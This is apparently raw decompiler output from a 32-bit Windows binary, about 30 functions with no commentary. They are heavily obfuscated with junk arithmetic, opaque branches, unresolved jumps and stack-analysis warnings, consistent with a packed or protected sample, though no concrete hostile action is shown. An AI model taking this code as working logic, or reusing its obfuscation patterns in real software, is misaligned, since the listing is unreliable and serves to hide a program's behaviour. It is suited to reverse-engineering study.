// 419DF4: variable 'v7' is possibly undefined
// 419D83: variable 'v5' is possibly undefined
// 419D83: variable 'v4' is possibly undefined
// 401F0F: variable 'v3' is possibly undefined
// 4446ED: using guessed type int dword_4446ED;
// 444725: using guessed type int dword_444725;
// 444731: using guessed type int dword_444731;

//----- (00418E0C) --------------------------------------------------------
void __stdcall sub_418E0C(int a1, int a2, int a3, int a4)
{
  JUMPOUT(0x41B699);
}
// 41AC44: control flows out of bounds to 41B699

//----- (004193D2) --------------------------------------------------------
int __fastcall sub_4193D2(int a1, int a2, int a3, int a4)
{
  int v4; // eax
  char v5; // cf
  int v6; // eax
  unsigned int v7; // edx
  unsigned int v8; // ecx
  void *v9; // ecx
  unsigned int v10; // edx
  unsigned int v11; // ecx
  void *v12; // ecx
  int v13; // ecx
  int result; // eax
  int v15; // eax
  __int16 v16; // cx
  int v17; // eax
  char v18[32]; // [esp+18h] [ebp-100h] BYREF
  char v19[8]; // [esp+64h] [ebp-B4h] BYREF
  int v20; // [esp+6Ch] [ebp-ACh]
  int v21; // [esp+78h] [ebp-A0h]
  int v22; // [esp+E4h] [ebp-34h]
  unsigned __int16 v23; // [esp+108h] [ebp-10h]

  sub_41A35E((int)v18, a2, 7, (int)v18);
  sub_41AD04();
  v4 = ((2 * v17) ^ 0x24D7) - 10370 + 5749;
  v21 += v4;
  v15 = v4 | 0x7CD;
  if ( (v16 & 0x136B) != 0 )
    v15 -= 6272;
  sub_418E0C(0, v20 | v15, (int)v19, 0);
  sub_41B652(v5 + v6 + 4693, v7, v8);
  sub_41B008(v9, 22, 49, 19, 1057969774);
  sub_41B652(12010, v10, v11);
  sub_41B008(v12, 15, 35, 7, 186023180);
  result = 5494;
  if ( v22 != v13 )
    result = v23 | 0x1D4;
  return result;
}
// 41AA69: conditional instruction was optimized away because of 'eax.4>=7CDu'
// 41B7DA: variable 'v17' is possibly undefined
// 41A3E4: variable 'v5' is possibly undefined
// 41A3E4: variable 'v6' is possibly undefined
// 41A3EE: variable 'v7' is possibly undefined
// 41A3EE: variable 'v8' is possibly undefined
// 41A3FE: variable 'v9' is possibly undefined
// 41A411: variable 'v10' is possibly undefined
// 41A411: variable 'v11' is possibly undefined
// 41A427: variable 'v12' is possibly undefined
// 41A828: variable 'v13' is possibly undefined
// 41AA5B: variable 'v16' is possibly undefined

//----- (004194BA) --------------------------------------------------------
void __usercall start(int a1@<edx>, unsigned int a2@<ecx>, int a3@<ebx>, int a4@<edi>, int a5@<esi>)
{
  int v5; // ecx
  int v6; // edx
  int v7; // eax
  int v8; // eax
  int v9; // edx
  int v10; // ecx
  int v11; // edx
  int v12; // ecx
  int v13[16]; // [esp+60h] [ebp-210h] BYREF
  char v14[80]; // [esp+A0h] [ebp-1D0h] BYREF
  char v15[28]; // [esp+F0h] [ebp-180h] BYREF
  unsigned int v16; // [esp+204h] [ebp-6Ch]

  v7 = 16038;
  if ( a2 >= v16 )
  {
    v8 = 9211;
    if ( (a2 & 0x353B) == 0 )
      v8 = 18422;
    v7 = (v8 - 2108) ^ 0x1E58;
  }
  BYTE1(v7) ^= 0x41u;
  dword_443018 += 16335;
  dword_444729 = a4;
  dword_443038 += v7 - dword_44391C;
  dword_444719 = a1;
  dword_44477B = a5;
  dword_443028 += a5;
  LOBYTE(dword_44300C) = 56;
  dword_443018 -= 14536;
  unk_4446E9 = a2;
  unk_444787 = a3;
  dword_44300C += (int)&unk_444787;
  sub_418E0C(0, 29282, (int)v15, 0);
  sub_4193D2(v12, v11, 0, v13[0]);
  sub_41AD04();
  sub_418B2E(v10, v9, 1826603036, 0, v9);
  sub_41A35E(v5, (int)v14, 26, (int)v14);
  sub_419CEB((int)v13, v6, 0, (int)v13, 0);
  JUMPOUT(0x41B6EA);
}
// 418CB0: control flows out of bounds to 41B6EA
// 41B848: variable 'v12' is possibly undefined
// 41B848: variable 'v11' is possibly undefined
// 41AF31: variable 'v10' is possibly undefined
// 41AF31: variable 'v9' is possibly undefined
// 418C94: variable 'v5' is possibly undefined
// 418CA9: variable 'v6' is possibly undefined
// 44300C: using guessed type int dword_44300C;
// 443018: using guessed type int dword_443018;
// 443028: using guessed type int dword_443028;
// 443038: using guessed type int dword_443038;
// 44391C: using guessed type int dword_44391C;
// 444719: using guessed type int dword_444719;
// 444729: using guessed type int dword_444729;
// 44477B: using guessed type int dword_44477B;

//----- (00419C11) --------------------------------------------------------
int __userpurge sub_419C11@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4@<ebp>, int a5, int a6)
{
  int result; // eax
  int v7; // eax
  bool v8; // cf
  int v9; // eax

  v7 = *(_DWORD *)(a4 - 148) + __CFADD__(a1 + 35633, a1 + 35633) + 2 * (a1 + 35633) + 4349;
  if ( a3 )
  {
    v9 = v7 & 0x3C2;
    v8 = __CFADD__(v9, 14781);
    v7 = v9 + 14781;
  }
  else
  {
    v8 = 0;
    if ( (v7 & a2) == 0 )
      JUMPOUT(0x41B67D);
  }
  result = (v7 - (v8 + 10039)) ^ 0x3FDF | 0x323C;
  *(_DWORD *)(a4 - 300) |= result;
  return result;
}
// 419C50: control flows out of bounds to 41B67D

//----- (00419CEB) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
int __usercall sub_419CEB@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4, int a5)
{
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  return sub_419C11(a1, a2, a3, (int)&savedregs, a4, a5);
}
// 419CEE: bad sp value at call

//----- (0041A237) --------------------------------------------------------
void __thiscall sub_41A237(void *this, int a2, int a3, int a4)
{
  sub_41B008(this, 32, 49, 49, 465181835);
  JUMPOUT(0x41B6D5);
}
// 41ADE7: control flows out of bounds to 41B6D5

//----- (0041A284) --------------------------------------------------------
int __stdcall sub_41A284(int a1, int a2)
{
  int v2; // edx
  int v3; // ecx
  char v5[156]; // [esp+B4h] [ebp-13Ch] BYREF
  char v6[116]; // [esp+150h] [ebp-A0h] BYREF
  int v7; // [esp+1C4h] [ebp-2Ch]

  sub_418E0C(0, v7, (int)v6, 0);
  return sub_419CEB((int)v5, v2, v3, (int)v5, 0);
}
// 419BB4: variable 'v2' is possibly undefined
// 419BB4: variable 'v3' is possibly undefined

//----- (0041A35E) --------------------------------------------------------
int __fastcall sub_41A35E(int a1, int a2, int a3, int a4)
{
  char v4; // cf
  int v6; // eax
  int v7; // ecx
  int v8; // eax
  unsigned int v9; // edx
  unsigned int v10; // ecx
  int v11; // eax
  unsigned int v12; // edx
  unsigned int v13; // ecx
  int v14; // eax
  char v15[52]; // [esp+84h] [ebp-348h] BYREF
  char v16[104]; // [esp+B8h] [ebp-314h] BYREF
  char v17[88]; // [esp+120h] [ebp-2ACh] BYREF
  char v18[16]; // [esp+178h] [ebp-254h] BYREF
  char v19[360]; // [esp+188h] [ebp-244h] BYREF
  int v20; // [esp+2F0h] [ebp-DCh]

  sub_419CEB((int)v16, a2, 0, (int)v16, 0);
  sub_418E0C(0, 1669981493, (int)v18, 0);
  sub_418E0C(0, (int)v19, (int)v19, 0);
  sub_419CEB(v6 | 0x35, (int)v17, v7, (int)v17, 0);
  sub_418E0C(0, v20, (int)v15, 0);
  v11 = sub_41B652(v8 ^ 0x3E25, v9, v10);
  v14 = sub_41B652(v11 + 16133, v12, v13);
  return v14 + v4 + v14;
}
// 418CF5: variable 'v6' is possibly undefined
// 418D01: variable 'v7' is possibly undefined
// 418D32: variable 'v8' is possibly undefined
// 418D37: variable 'v9' is possibly undefined
// 418D37: variable 'v10' is possibly undefined
// 418D41: variable 'v12' is possibly undefined
// 418D41: variable 'v13' is possibly undefined
// 418BD1: variable 'v4' is possibly undefined

//----- (0041AD04) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
void sub_41AD04()
{
  unsigned int v0; // edx
  unsigned int v1; // ecx
  int v2; // eax
  int v3; // ecx
  int v4; // ecx
  int v5; // eax
  int v6; // eax
  void *v7; // ecx
  int v8; // edx
  int v9; // edx
  void *v10; // ecx
  void *v11; // ecx
  int v12; // ecx
  int v13; // edx
  void *v14; // ecx
  _DWORD v15[26]; // [esp-264h] [ebp-268h] BYREF
  int v16[30]; // [esp-1FCh] [ebp-200h] BYREF
  int v17; // [esp-184h] [ebp-188h] BYREF
  int v18; // [esp-168h] [ebp-16Ch]
  int v19; // [esp-104h] [ebp-108h]
  _BYTE v20[12]; // [esp-6Ch] [ebp-70h] BYREF
  _BYTE v21[12]; // [esp-60h] [ebp-64h] BYREF
  _BYTE v22[88]; // [esp-54h] [ebp-58h] BYREF

  sub_41A284(57, v18);
  sub_41B008(v10, 17, 53, 44, (int)v10);
  GetCurrentProcess();
  sub_41B008(v11, 2, 30, 35, (int)v11);
  v6 = (sub_41A284(23, v16[13]) & 0x695 ^ 0x1A26) - 15167;
  sub_418E0C(0, v6, (int)&v17, 0);
  GetCurrentThreadId();
  sub_419CEB(0, v8, (int)v15, (int)v15, 0);
  sub_41B008(v7, 26, 26, 35, v16[9]);
  sub_41B008(v14, 35, 35, 24, v13);
  sub_41A35E((int)v21, v9, 13, (int)v21);
  GetCurrentProcess();
  sub_418E0C(0, (int)v22, (int)v22, 0);
  GetCurrentProcess();
  sub_41A284(20, v3);
  v5 = sub_41A35E(v4, (int)v16, 56, (int)v16);
  v2 = sub_41B652(v19 | v15[19] | v5, v0, v1);
  v18 |= v2;
  sub_41B5D9((int)v20, v12, (int)v20, 0, 41, 47);
  JUMPOUT(0x41B6E1);
}
// 41A7E0: control flows out of bounds to 41B6E1
// 41B050: bad sp value at call
// 41A963: bad sp value at call
// 419052: bad sp value at call
// 41B780: bad sp value at call
// 41B4D0: variable 'v10' is possibly undefined
// 41B4F1: variable 'v11' is possibly undefined
// 41AFB3: variable 'v8' is possibly undefined
// 41AE4F: variable 'v7' is possibly undefined
// 41BC73: variable 'v14' is possibly undefined
// 41BC73: variable 'v13' is possibly undefined
// 41B050: variable 'v9' is possibly undefined
// 419042: variable 'v3' is possibly undefined
// 419052: variable 'v4' is possibly undefined
// 418BE9: variable 'v0' is possibly undefined
// 418BE9: variable 'v1' is possibly undefined
// 41B780: variable 'v12' is possibly undefined

//----- (0041B008) --------------------------------------------------------
int __thiscall sub_41B008(void *this, int a2, int a3, int a4, int a5)
{
  char v5; // cf
  __int16 v6; // ax
  int v7; // eax
  int v9; // eax
  unsigned int v10; // eax
  __int16 v11; // dx
  int v12; // ecx
  int v13; // ecx
  char v14[12]; // [esp+24h] [ebp-1DCh] BYREF
  char v15[8]; // [esp+30h] [ebp-1D0h] BYREF
  char v16[76]; // [esp+38h] [ebp-1C8h] BYREF
  int v17; // [esp+84h] [ebp-17Ch]
  int v18; // [esp+9Ch] [ebp-164h]
  int v19; // [esp+118h] [ebp-E8h]
  char v20[16]; // [esp+164h] [ebp-9Ch] BYREF
  char v21[16]; // [esp+174h] [ebp-8Ch] BYREF
  int v22; // [esp+198h] [ebp-68h]
  int v23; // [esp+1B8h] [ebp-48h]

  v10 = v19 ^ ((sub_41A35E((int)this, (int)v21, 24, (int)v21) & 0x1E50) + 15102);
  v9 = (v10 < 0xA73) + v10 - 2675 + 6407;
  if ( v12 || (v11 & 0x903) == 0 )
    v18 -= v9;
  sub_418E0C(0, v17, (int)v14, 0);
  v22 += (v6 - (v5 + 11666)) & 0x26C | 0x25B6;
  sub_41A35E(v13, (int)v15, 23, (int)v15);
  sub_418E0C(0, v23, (int)v20, 0);
  sub_418E0C(0, -656810509, (int)v16, 0);
  return v5 + v7 + 8320;
}
// 4190C0: variable 'v6' is possibly undefined
// 4190C0: variable 'v5' is possibly undefined
// 41B9B6: variable 'v13' is possibly undefined
// 419A2B: variable 'v7' is possibly undefined
// 41B44B: variable 'v12' is possibly undefined
// 41B459: variable 'v11' is possibly undefined

//----- (0041B5D9) --------------------------------------------------------
int __userpurge sub_41B5D9@<eax>(int a1@<eax>, int a2@<ecx>, int a3, int a4, int a5, int a6)
{
  unsigned int v6; // ett
  int result; // eax
  int v8; // eax
  unsigned int v9; // edx
  unsigned int v10; // ecx
  __int16 v11; // ax
  int v12; // edx
  int v13; // ecx
  int v14; // eax
  unsigned int v15; // eax
  bool v16; // cf
  unsigned int v17; // eax
  unsigned int v18; // eax
  char v19[368]; // [esp+228h] [ebp-18Ch] BYREF
  int v20; // [esp+398h] [ebp-1Ch]

  v8 = sub_419CEB(a1, (int)v19, a2, (int)v19, 0);
  v11 = sub_41B652(
          2 * ((v8 | 0x360F) - 20316) - (__CFADD__((v8 | 0x360F) - 20316, (v8 | 0x360F) - 20316) + 2507),
          v9,
          v10);
  v14 = (v11 + v16 + v11) & 0x303F;
  if ( (v13 & v14) != 0 )
    goto LABEL_6;
  v15 = v14 + 9978;
  v16 = v15 < 0x1D33;
  v17 = v15 - 7475;
  v6 = v16 + 4614;
  result = v17
         - v6
         + (v17 < v6)
         + v17
         - v6
         - ((__CFADD__(v17 < v6, v17 - v6) | __CFADD__(v17 - v6, (v17 < v6) + v17 - v6))
          + 15844);
  if ( v12 )
  {
    v14 = v20 & 0x1261 | 0x23BB;
LABEL_6:
    v18 = v14 + 1782;
    result = (v18 < 0x21C8)
           + v18
           - 8648
           + 5526
           - ((__CFADD__(v18 < 0x21C8, v18 - 8648) | __CFADD__((v18 < 0x21C8) + v18 - 8648, 5526))
            + 9122);
  }
  return result;
}
// 419FF9: variable 'v9' is possibly undefined
// 419FF9: variable 'v10' is possibly undefined
// 419FFE: variable 'v16' is possibly undefined
// 41983B: variable 'v12' is possibly undefined
// 41A011: variable 'v13' is possibly undefined

//----- (0041B652) --------------------------------------------------------
int __usercall sub_41B652@<eax>(int a1@<eax>, unsigned int a2@<edx>, unsigned int a3@<ecx>)
{
  int v3; // eax
  unsigned int v5; // eax
  int v6; // eax
  int v7; // [esp+104h] [ebp-194h]
  unsigned int v8; // [esp+110h] [ebp-188h]

  v5 = a1 ^ 0x1649;
  if ( v8 <= a3 )
    v5 = (v5 ^ 0x1CB9) + 8701;
  v6 = (__PAIR64__(v5 - 8098, v5) - 0x222600001FA2i64 - (((unsigned int)(v5 < 0x1FA2) + 8742) | 0x303000000000i64)) >> 32;
  v3 = ((2 * v6 - (__CFADD__(v6, v6) + v7)) ^ 0x3376 | 0x28CC) + 1779;
  if ( a2 < a3 )
    goto LABEL_7;
  if ( a2 )
  {
    v3 = 0;
LABEL_7:
    v3 += 7340;
  }
  return v3 | 0x3776;
}
// 41B71F: variable 'v8' is possibly undefined
// 419CB5: variable 'v7' is possibly undefined

//----- (0041B7E6) --------------------------------------------------------
int __userpurge sub_41B7E6@<eax>(int result@<eax>, __int16 a2@<dx>, int a3, int a4, int a5, int a6)
{
  if ( (a2 & 0x327B) == 0 )
    result = (((_WORD)result + 2005) & 0x1E01)
           + 6363
           + __CFADD__(((_WORD)result + 2005) & 0x1E01, 6363)
           + (((_WORD)result + 2005) & 0x1E01)
           + 6363;
  return result;
}

//----- (0041EB46) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_41EB46(bool a1@<zf>, char a2@<sf>, char a3@<of>, double a4@<st0>)
{
  int v4; // ecx
  void **v5; // edi
  void **v7; // ebx
  char v10; // cf
  char v11; // ch
  _DWORD *v12; // esi
  int v13; // [esp-24h] [ebp-24h]
  int v14; // [esp-20h] [ebp-20h] BYREF
  int v15; // [esp-1Ch] [ebp-1Ch]
  int v16; // [esp-18h] [ebp-18h]
  void **v17; // [esp-14h] [ebp-14h]
  void **v18; // [esp-10h] [ebp-10h]
  void **v19; // [esp-Ch] [ebp-Ch]
  void **v20; // [esp-8h] [ebp-8h]
  void **v21; // [esp-4h] [ebp-4h]
  void *retaddr[2]; // [esp+0h] [ebp+0h] BYREF

  v4 = v15;
  v5 = v19;
  _ESI = v20;
  v7 = v21;
  v21 = v20;
  v20 = v19;
  v19 = v18;
  v18 = retaddr;
  v17 = v7;
  v16 = v15;
  v15 = v14;
  v14 = v13;
  __asm { outsb }
  if ( !a3 )
  {
    if ( !(a2 ^ a3 | a1) )
    {
      _RAX = MEMORY[0x8D3A3A57](v4);
      __asm { rcl     byte ptr [eax], cl }
      BYTE1(_ECX) = (_BYTE)v7 + v10 + v11;
      a1 = *(_BYTE *)(_ECX - 224354044) + (_BYTE)_ECX == 0;
      __DS__ = *((_WORD *)_ESI + 2);
      v12 = _ESI + 1;
      *(_QWORD *)(HIDWORD(_RAX) + 125) = (__int64)a4;
      if ( a1 )
      {
        if ( SHIDWORD(_RAX) < *(v12 - 153373304) )
        {
          *v5 = (void *)*v12;
          __asm { retf }
        }
        *v12 |= 0x4BCB8C10u;
        JUMPOUT(0x41EB42);
      }
      JUMPOUT(0x41EB2E);
    }
    *v7 = (char *)*v7 - 815266807;
    __halt();
  }
  __asm { retf }
}
// 41EB48: positive sp value 24 has been found
// 41EB2D: control flows out of bounds to 41EB2E
// 41EB41: control flows out of bounds to 41EB42
// 41EB48: variable 'v13' is possibly undefined
// 41EB5F: variable 'v10' is possibly undefined
// 41EB5F: variable 'v11' is possibly undefined
// 41EB63: variable '_ECX' is possibly undefined

// nfuncs=30 queued=30 decompiled=30 lumina nreq=0 worse=0 better=0
// ALL OK, 30 function(s) have been successfully decompiled
